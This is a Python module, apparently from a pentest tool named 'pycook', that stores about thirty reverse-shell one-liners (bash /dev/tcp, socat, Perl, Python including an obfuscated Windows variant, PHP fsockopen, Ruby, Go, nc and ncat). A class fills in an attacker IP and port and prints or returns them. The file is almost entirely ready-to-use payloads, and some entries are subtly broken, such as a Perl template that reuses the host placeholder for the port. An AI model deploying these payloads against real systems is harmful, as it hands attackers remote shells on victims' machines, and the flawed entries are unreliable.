from random import randint
from colored import fg, attr

# ***** Reverse Shells *****

rev_shells = {
        "bash_tcp_1": """bash -i >& /dev/tcp/{}/{} 0>&1""",
        "bash_tcp_2": """0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196""",
        "bash_udp_1": """sh -i >& /dev/udp/{}/{} 0>&1""",
        "socat_1":  """/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}""",
        "perl_1": """perl -e 'use Socket;$i="{0}";$p={0};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
        "perl_2": """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
        "perl_win_1": """perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
        "py_ip4_nix_1": """export RHOST="{}";export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""",
        "py_ip4_nix_2": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""",
        "py_ip6_nix_1": """python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("{}",{},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'""",
        "py_ipv6_nix_2": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
        "py_ipv4_win_1": """C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{0}', {1})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])}})(), type('try', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]}})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))""",
        "php_1": """php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "php_2": """php -r '$sock=fsockopen("{}",{});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "php_3": """php -r '$sock=fsockopen("{}",{});`/bin/sh -i <&3 >&3 2>&3`;'""",
        "php_4": """php -r '$sock=fsockopen("{}",{});system("/bin/sh -i <&3 >&3 2>&3");'""",
        "php_5": """php -r '$sock=fsockopen("{}",{});passthru("/bin/sh -i <&3 >&3 2>&3");'""",
        "php_6": """php -r '$sock=fsockopen("{}",{});popen("/bin/sh -i <&3 >&3 2>&3", "r");'""",
        "php_7": """php -r '$sock=fsockopen("{}",{});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
        "rub_lin_1": """ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
        "rub_lin_2": """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
        "rub_win_1": """ruby -rsocket -e 'c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
        "golang_1": """echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{}:{}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""",
        "nc_trad_1": """nc -e /bin/sh {} {}""",
        "nc_trad_2": """nc -e /bin/bash {} {}""",
        "nc_trad_3": """nc -c bash {} {}""",
        "nc_open_bsd": """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f""",
        "netcat_tcp": """ncat {} {} -e /bin/bash""",
        "netcat_udp": """ncat --udp {} {} -e /bin/bash"""

}


class Payloads:
    def __init__(self, ip:str, port:int):
        self.ip = ip
        self.port = port

    def get_shell(self, name):
        name = name.strip()
        if name == "bash_tcp_1":
            return rev_shells["bash_tcp_1"].format(self.ip, self.port)
        elif name == "bash_tcp_2":
            return rev_shells["bash_tcp_2"].format(self.ip, self.port)
        elif name == "bash_udp_1":
            return rev_shells["bash_udp_1"].format(self.ip, self.port)
        elif name == "socat_1":
            return rev_shells["socat_1"].format(self.ip, self.port)
        elif name == "perl_1":
            return rev_shells["perl_1"].format(self.ip, self.port)
        elif name == "perl_2":
            return rev_shells["perl_2"].format(self.ip, self.port)
        elif name == "perl_win_1":
            return rev_shells["perl_win_1"].format(self.ip, self.port)
        elif name == "py_ip4_nix_1":
            return rev_shells["py_ip4_nix_1"].format(self.ip, self.port)
        else:
            print(f"[-] '{name}' is not a valid reverse shell name... run `pycook revs -h` to get help")

    def list_shells(self):
        print(
            "%sReverse Shell Name%s" % (fg(randint(1, 220)), attr(0)), "\t\t",
            "%sReverse Shell%s" % (fg(randint(1, 220)), attr(0))
        )
        for name, revshell in rev_shells.items():
            print(name, "\t\t", revshell.format(self.ip, self.port), "\n")
